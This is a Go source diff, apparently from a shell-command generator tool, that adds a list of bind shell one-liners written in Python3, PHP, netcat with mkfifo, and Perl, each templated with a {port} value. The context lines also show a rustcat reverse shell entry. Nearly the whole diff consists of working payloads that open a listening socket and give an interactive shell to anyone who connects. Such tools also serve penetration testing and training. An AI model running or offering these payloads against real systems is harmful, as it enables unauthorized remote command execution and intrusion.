@@ -11,6 +11,12 @@ type ReverseShellCommand struct {
 	Meta    []string
 }
 
+type BindShellCommand struct {
+	Name    string
+	Command string
+	Meta    []string
+}
+
 var OSTypes = []string{
 	"All",
 	"Linux",
@@ -115,5 +121,28 @@ var ReverseShellCommands = []ReverseShellCommand{
 		"rustcat",
 		"rcat connect -s {shell} {ip} {port}",
 		[]string{"linux", "mac"},
+	},
+}
+
+var BindShellCommands = []BindShellCommand{
+	{
+		"Python3 Bind",
+		`python3 -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",{port}));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'`,
+		[]string{"bind", "mac", "linux", "windows"},
+	},
+	{
+		"PHP Bind",
+		`php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",{port});\socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,\"$ \",2))exit;\$in=socket_read($cl,100);$cmd=popen(\"$in\",\"r\");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'`,
+		[]string{"bind", "mac", "linux", "windows"},
+	},
+	{
+		"nc Bind",
+		`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 {port} > /tmp/f`,
+		[]string{"bind", "mac", "linux"},
+	},
+	{
+		"Perl Bind",
+		`perl -e 'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");};'`,
+		[]string{"bind", "mac", "linux"},
 	},
 }
